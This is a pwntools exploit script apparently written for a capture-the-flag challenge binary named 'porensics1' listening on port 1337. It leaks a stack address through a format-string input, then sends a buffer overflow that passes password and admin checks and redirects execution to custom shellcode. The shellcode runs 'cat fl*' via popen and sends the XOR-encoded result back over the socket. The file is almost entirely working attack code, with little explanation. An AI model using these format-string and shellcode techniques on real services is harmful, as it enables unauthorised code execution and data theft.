from pwn import *
import os, subprocess


binary = "./porensics1"
elf = context.binary = ELF(binary, checksec=False)

gs = """
set follow-fork-mode child
break *check_password+516
continue
"""

if args.REMOTE:
    p = remote("192.168.48.129", 1337)
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    os.system('./porensics1 &')
    sleep(0.5)
    pid = int(subprocess.getoutput("pgrep -f '^./porensics1'"))
    print(f"PID: {pid}")
    p = remote("localhost", 1337)
else:
    os.system('./porensics1 &')
    p = remote("localhost", 1337)



### GET STACK LEAK ###
p.sendline(b'%p')
sleep(0.5)
p.sendline(b'a')
p.recvuntil(b'Invalid')
stack_leak = int(p.recvline().split(b"user '")[1].split(b"'")[0],16)
print(f"Stack leak: {hex(stack_leak)}")
p.close()


if args.GDB:
    gdb.attach(pid, gdbscript=gs)



### EXPLOIT ###
if args.REMOTE:
    p = remote("192.168.48.129", 1337)
else:
    p = remote("localhost", 1337)
p.recvuntil(b'User')
p.sendline(b'legoclones') # this doesn't matter bc password overwrites it anyway
p.recvuntil(b'Password: ')

shellcode = asm(
"""
sub rsp, 0x208              # stack alignment + function calls not interfering with shellcode
mov rbx, rdi                # save the client fd (rdi) to rbx

// popen('cat flag.txt')
mov r8, 0x2a6c6620746163    # 'cat fl*'
push r8
mov rdi, rsp                # arg1
mov rsi, 0x409ba3           # 'r'
mov rax, 0x446450           # popen
call rax

// fgets_unlocked($rsp, 0x30, $rax)
mov rdi, rsp                # arg1
mov rsi, 0x30               # arg2
mov rdx, rax                # arg3 (FILE*)
mov rax, 0x449770           # fgets_unlocked (fgets not present)
call rax

// XOR flag with 0x509d7c94
mov r9, 0x509d7c94          # XOR key
xor dword ptr [rsp], r9d    # XOR the first 4 bytes of the flag
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4
xor dword ptr [rsp], r9d
add rsp, 0x4

sub rsp, 0x30               # reset rsp

// write 0x30 bytes to the client fd
mov rdi, rbx                # restore the client fd
mov rsi, rsp                # arg2 (buffer)
mov rdx, 0x30               # arg3 (size)
mov rax, 1                  # syscall number for write
syscall

// now jump back to main and call exit()
mov rax, 0x401aee
jmp rax
""")
print(f"Shellcode length: {len(shellcode)}")
payload = flat(
    b'password\x00',                            # pass the pwd check
    b'b'*199,
    b'admin\x00',                               # pass the admin check
    shellcode,
    b'c'*(218-len(shellcode)),                  # fill the rest of the buffer

    ### BEGIN ROP CHAIN ###
    p64(0),                                     # rbp
    p64(stack_leak + 0xd6),                     # rip
)
p.sendline(payload)


### FLAG + CLEANUP ###
print(xor(p.recvall()[44:], p32(0x509d7c94)))
p.close()

os.system('fuser -k 1337/tcp')